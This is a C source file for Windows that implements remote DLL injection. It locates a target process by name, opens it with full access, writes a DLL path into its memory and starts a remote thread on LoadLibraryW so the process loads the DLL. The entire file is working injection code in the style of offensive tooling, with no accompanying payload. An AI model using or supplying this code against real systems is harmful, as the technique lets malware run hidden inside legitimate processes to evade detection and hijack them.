#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>

#include "error.h"
#include "dll_injection.h"

BOOL findTargetProcessRemoteDLL(IN char* szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap;
    BOOL bState = TRUE;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        handleError(ERROR_INVALID_PROCESS, "Failed to create process snapshot");
        bState = FALSE; goto Cleanup;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        handleError(ERROR_INVALID_PROCESS, "Failed to get first process");
        CloseHandle(hProcessSnap);
        bState = FALSE; goto Cleanup;
    }

    do {
        if (strcmp(pe32.szExeFile, szProcessName) == 0) {
            *dwProcessId = pe32.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessId);
            if (*hProcess == NULL) {
                handleError(ERROR_FAILED_TO_OPEN_PROCESS, "Failed to open process");
                CloseHandle(hProcessSnap);
                bState = FALSE; goto Cleanup;
            }

            printf("Found target process: %s (PID: %lu)\n", szProcessName, *dwProcessId);
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    
    Cleanup:
        if (hProcessSnap != INVALID_HANDLE_VALUE) {
            CloseHandle(hProcessSnap);
        }
        if (!*dwProcessId || !*hProcess) {
            return bState;
        }

        return bState;
}

BOOL injectDLL(IN HANDLE hProcess, IN  LPWSTR DllPath, IN HMODULE hKernel32Module){

    BOOL bState = TRUE;
    HANDLE hThread = NULL;
    LPVOID pAddress = NULL;
    SIZE_T dwBytesWritten = 0;
    DWORD  dwSizeToWrite = lstrlenW(DllPath) * sizeof(WCHAR);

    LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)(void *)GetProcAddress(hKernel32Module, "LoadLibraryW");

    pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pAddress) {
        handleError(ERROR_FAILED_TO_ALLOCATE_MEMORY, "Failed to allocate memory in target process");
        bState = FALSE; goto Cleanup;
        
    }

    if (!WriteProcessMemory(hProcess, pAddress, DllPath, dwSizeToWrite, &dwBytesWritten)) {
        handleError(ERROR_FAILED_TO_ALLOCATE_MEMORY, "Failed to write memory in target process");
        bState = FALSE; goto Cleanup;
    }

    printf("[+] DLL injected successfully\n");


    hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pAddress, 0, NULL);
    if (!hThread) {
        handleError(ERROR_FAILED_TO_CREATE_THREAD, "Failed to create remote thread");
        bState = FALSE; goto Cleanup;
    }

    printf("[+] DLL executed successfully\n");

    Cleanup:
        if (hThread) {
            CloseHandle(hThread);
        }
        return bState;
}


BOOL runDLLInjection(IN char* szProcessName, IN HMODULE hKernel32Module, IN LPWSTR DllPath) {
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL;

    if (!findTargetProcessRemoteDLL(szProcessName, &dwProcessId, &hProcess)) {
        handleError(ERROR_INVALID_PROCESS, "Failed to find target process");
        return FALSE;
    }

    if (!injectDLL(hProcess, DllPath, hKernel32Module)) {
        handleError(ERROR_INVALID_INJECTION, "Failed to inject DLL");
        return FALSE;
    }
    
    return TRUE;
}
